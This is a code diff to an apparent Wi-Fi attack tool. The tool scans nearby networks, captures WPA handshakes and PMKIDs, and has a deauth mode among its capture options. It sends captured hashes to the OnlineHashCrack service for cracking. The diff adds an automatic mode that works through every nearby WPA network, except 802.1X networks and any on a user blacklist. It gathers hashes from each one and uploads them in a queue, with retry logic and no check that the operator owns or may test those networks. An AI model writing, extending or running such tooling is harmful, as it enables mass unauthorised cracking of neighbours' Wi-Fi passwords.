@@ -1,5 +1,6 @@
 """Wi-Fi discovery, capture storage, and OnlineHashCrack submission."""
 
+import csv
 import json
 import os
 from pathlib import Path
@@ -24,6 +25,16 @@ class WifiError(Exception):
     pass
 
 
+class AuthenticationError(WifiError):
+    pass
+
+
+class UploadRetry(WifiError):
+    def __init__(self, message, delay=60):
+        super().__init__(message)
+        self.delay = delay
+
+
 @dataclass(frozen=True)
 class Network:
     bssid: str
@@ -31,6 +42,20 @@ class Network:
     frequency: int
     signal: int
     security: str
+
+
+@dataclass(frozen=True)
+class AutoStatus:
+    phase: str
+    network: str = ""
+    attempted: int = 0
+    total: int = 0
+    found: int = 0
+    skipped: int = 0
+    failed: int = 0
+    uploaded: int = 0
+    queued: int = 0
+    upload_failed: int = 0
 
 
 def split_nmcli(line):
@@ -72,20 +97,22 @@ def scan():
             continue
         if network.bssid not in by_bssid or network.signal > by_bssid[network.bssid].signal:
             by_bssid[network.bssid] = network
-    return sorted(by_bssid.values(), key=lambda network: -network.signal)
+    ignored = blacklist()
+    return sorted((network for network in by_bssid.values() if not is_ignored(network, ignored)),
+                  key=lambda network: -network.signal)
 
 
 def read_setting(name):
     path = CONFIG / name
     try:
-        return path.read_text(encoding="ascii").strip()
+        return path.read_text(encoding="utf-8").strip()
     except (OSError, UnicodeError):
         return ""
 
 
 def save_setting(name, value):
     CONFIG.mkdir(mode=0o700, parents=True, exist_ok=True)
-    with tempfile.NamedTemporaryFile(dir=CONFIG, mode="w", encoding="ascii", delete=False) as output:
+    with tempfile.NamedTemporaryFile(dir=CONFIG, mode="w", encoding="utf-8", delete=False) as output:
         temporary = Path(output.name)
         try:
             output.write(value + "\n")
@@ -94,6 +121,22 @@ def save_setting(name, value):
             temporary.replace(CONFIG / name)
         finally:
             temporary.unlink(missing_ok=True)
+
+
+def parse_blacklist(value):
+    entries = next(csv.reader([value], skipinitialspace=True, strict=True))
+    return frozenset(filter(None, map(str.strip, entries)))
+
+
+def blacklist():
+    try:
+        return parse_blacklist(read_setting("ssid-blacklist"))
+    except csv.Error as error:
+        raise WifiError("Fix the SSID blacklist in Settings") from error
+
+
+def is_ignored(network, ignored):
+    return network.ssid in ignored or (not network.ssid and bool(ignored))
 
 
 def extract_hashes(pcap, bssid, output, timeout):
@@ -115,9 +158,11 @@ def hash_kind(hashes):
     return "WPA handshake" if any(line.startswith("WPA*02*") for line in hashes) else "PMKID"
 
 
-def capture(network, interface, mode, password, cancel, report):
+def capture(network, interface, mode, password, cancel, report, *, time_limit=None):
     if not interface:
         raise WifiError("Set capture adapter in Settings")
+    if is_ignored(network, blacklist()):
+        raise WifiError("Network is excluded by the SSID blacklist")
     bssid = network.bssid.replace(":", "").lower()
     folder = None
     if mode != "deauth":
@@ -153,6 +198,8 @@ def capture(network, interface, mode, password, cancel, report):
                         if os.pread(errors.fileno(), 4096, 0).count(prompt) > 1:
                             break
                         now = time.monotonic()
+                        if time_limit is not None and now - started >= time_limit:
+                            break
                         end = os.fstat(errors.fileno()).st_size
                         tail = os.pread(errors.fileno(), 4096, max(0, end - 4096))
                         statuses = [line[10:] for line in tail.decode(errors="replace").splitlines()
@@ -184,7 +231,7 @@ def capture(network, interface, mode, password, cancel, report):
             error = next((line.removeprefix("ZEROGOTCHI: ").strip()
                           for line in detail.splitlines() if "ZEROGOTCHI: " in line), "")
             if prompt.decode() in detail and not error:
-                error = "User password authentication failed"
+                raise AuthenticationError("User password authentication failed")
             if pcap and pcap.stat().st_size > 24:
                 (folder / "network.json").write_text(json.dumps({"ssid": network.ssid}), encoding="utf-8")
                 error = (error or "Capture interrupted") + ". PCAP saved."
@@ -211,6 +258,64 @@ def capture(network, interface, mode, password, cancel, report):
         if pcap and (not pcap.exists() or pcap.stat().st_size <= 24):
             pcap.unlink(missing_ok=True)
             folder.rmdir()
+
+
+def auto_capture(interface, password, cancel, report, *, auto_upload=False, target_seconds=25):
+    nearby = scan()
+    targets = [network for network in nearby if network.ssid
+               and "WPA" in network.security and "802.1X" not in network.security]
+    skipped = len(nearby) - len(targets)
+    attempted = found = failed = 0
+    uploaded = upload_failed = 0
+    queue = []
+    next_upload = 0
+
+    def status(phase, network=""):
+        return AutoStatus(phase, network, attempted, len(targets), found, skipped,
+                          failed, uploaded, len(queue), upload_failed)
+
+    def send_pending(phase):
+        nonlocal uploaded, upload_failed, next_upload
+        while queue and not cancel.is_set() and time.monotonic() >= next_upload:
+            report(status(phase))
+            try:
+                accepted, skipped_count, rejected = upload(queue[0])
+            except UploadRetry as error:
+                next_upload = time.monotonic() + error.delay
+                break
+            except (WifiError, OSError):
+                upload_failed += 1
+            else:
+                uploaded += int(bool(accepted or skipped_count))
+                upload_failed += int(bool(rejected))
+            queue.pop(0)
+
+    for network in targets:
+        if cancel.is_set():
+            break
+        attempted += 1
+        report(status("Auditing", network.ssid))
+        mode = "active" if network.frequency < 5925 else "passive"
+        try:
+            _, hashes, _ = capture(network, interface, mode, password, cancel,
+                                   lambda message: None, time_limit=target_seconds)
+        except AuthenticationError:
+            raise
+        except WifiError:
+            if not cancel.is_set():
+                failed += 1
+        else:
+            found += int(hashes is not None)
+            if hashes and auto_upload:
+                queue.append(hashes)
+        send_pending("Uploading")
+    del password
+    while queue and not cancel.is_set():
+        report(status("Idling"))
+        if cancel.wait(max(0, next_upload - time.monotonic())):
+            break
+        send_pending("Idling")
+    return status("Stopped" if cancel.is_set() else "Idling")
 
 
 def capture_name(path):
@@ -265,14 +370,22 @@ def upload(path):
             except (ValueError, OSError):
                 result = {}
             request_id = str(result.get("request_id", ""))[:32]
-            if error.code == 429:
-                raise WifiError("Rate limited. Retry later. " + request_id) from error
+            if error.code == 429 or error.code >= 500:
+                retry_after = error.headers.get("Retry-After") or result.get("retry_after")
+                try:
+                    delay = max(60, int(retry_after))
+                except (ValueError, TypeError):
+                    delay = 60
+                raise UploadRetry(f"OnlineHashCrack HTTP {error.code}. Retry later. {request_id}",
+                                  delay) from error
             raise WifiError(f"OnlineHashCrack HTTP {error.code}. {request_id}") from error
-        except (URLError, OSError, ValueError) as error:
-            raise WifiError("OnlineHashCrack connection failed") from error
+        except (URLError, OSError) as error:
+            raise UploadRetry("OnlineHashCrack connection failed. Retry later.") from error
+        except ValueError as error:
+            raise WifiError("OnlineHashCrack returned an unreadable response") from error
         if not result.get("success"):
             raise WifiError("OnlineHashCrack rejected request " + str(result.get("request_id", ""))[:32])
         accepted += result.get("accepted", {}).get("count", 0)
         skipped += result.get("skipped", {}).get("count", 0)
         rejected += result.get("rejected", {}).get("count", 0)
-    return f"Accepted {accepted}. Skipped {skipped}. Rejected {rejected}."
+    return accepted, skipped, rejected
